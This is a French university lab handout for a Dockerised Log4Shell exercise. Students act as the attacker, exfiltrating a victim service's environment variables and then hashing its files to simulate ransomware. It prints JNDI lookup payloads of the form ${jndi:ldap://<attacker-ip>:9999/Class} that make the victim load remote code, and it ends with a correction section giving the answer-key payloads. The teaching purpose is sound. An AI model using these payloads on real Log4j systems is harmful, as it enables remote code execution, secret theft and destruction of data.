# TP Log4Shell 
#### Victor GAILLARD - Lou LABUSSIERE - Erina POINT - Ugo VIGNON
#### Envoyez votre compte-rendu à l'adresse lou.labussiere@etu.uca.fr
---
## **Objectif** : Hasher les fichiers d'un serveur victime pour simuler une attaque ransomware avec la faille Log4Shell

### **Configuration** :
 Pour commencer, clonez le projet (ou téléchargez l'archive).  

 Dans ce projet, vous trouverez : 
- Le serveur LDAP du pirate;
- Le serveur HTTP du pirate, contenant la codebase que vous aurez à coder;
- Un service de logging sur lequel vous pourrez requêter afin de récuperer des données;
- Le web service de la victime, qui contient les fichiers à hasher; 

Pour lancer le projet :
- Faite un `make all` pour générer tous les Dockerfile;
- Ensuite, faite un `docker-compose up` dans le répertoire cloné;

L'IP du serveur victime et des serveurs du pirate sont loggés avec ces lignes :
```sh
victim_1 | Running on IP : XXX.XXX
server_1 | Running on IP : XXX.XXX
```
 L'IP `server_1` sera à mettre dans le lookup plus tard.

 Si vous ajoutez une classe dans le dossier attacker/java, pensez à relancer vos containers !

---

### **Exercice 0** : Pour se mettre dans le bain
 Pour le temps de ce TP, vous serez le pirate >:) Vous allez donc réaliser une attaque exploitant la faille de Log4Shell sur un web service distant, dans le but de hasher les fichiers de la victime pour simuler un ransomware. 

Après plusieurs essais sur différents sites (en vain), vous tomber finalement sur ce site aux apparences plutôt vulnérables. Le formulaire de connexion n'a pas l'air très sécurisé...

 Avant toute chose, vous allez tester le fonctionnement de cette attaque en affichant dans les logs les valeurs des variables d'environnements de la victime.

Pour cela, vous allez devoir : 
- Créer une classe dans le dossier `attacker/java`. Cette classe devra récupérer les valeurs des variables d'environnements du web service victime, et les logger dans le service `logger_1`. Pour vous aider, consultez l'exemple `WithReturn.java`.

- Utilisez le lookup vu en cours pour lancer votre attaque. Exemple : `${jndi:ldap://<ip_server_1>:<port>/WithReturn}`. 

Pour vérifier que votre attaque a bien marchée, vérifier dans les logs de `logger_1` que les variables d'environnments de la vicitme sont bien affichées après l'envoie de votre requête.

---

### **Exercice 1** : L'attaque, la vraie de vraie
Maintenant que vous avez réussi à afficher les variables d'environnements de votre victime, vous allez pouvoir hasher ses fichiers (mouhaha) !! 

Pour ce faire, vous allez devoir recréer une classe qui va cette fois récupérer les fichiers du serveur de la victime, et les hasher avec l'algorithme SHA-256.

Pour vous aidez:
- la classe `MessageDigest` permet de faire du hashage, plus qu'à savoir comment...
- N'oubliez pas de modifier votre lookup en fonction de votre nouvelle classe ;p

Pour vérifier que cette attaque a bien marché, vous devriez voir que tous les fichiers du web service de la victime ont été hashés. Si c'est le cas, bravo vous êtes un pirate !! 

# POUR LA CORRECTION : 
les classes malicieuses sont EnvVariable.java pour l'exercice 0, et Encryptor.java pour l'exercice 1.
Les loopkups sont du coup : 
```
${jndi:ldap://ip_server_1:9999/EnvVariable} pour l'exo 0 et ${jndi:ldap://ip_server_1:9999/Encryptor} pour l'exo 1
```
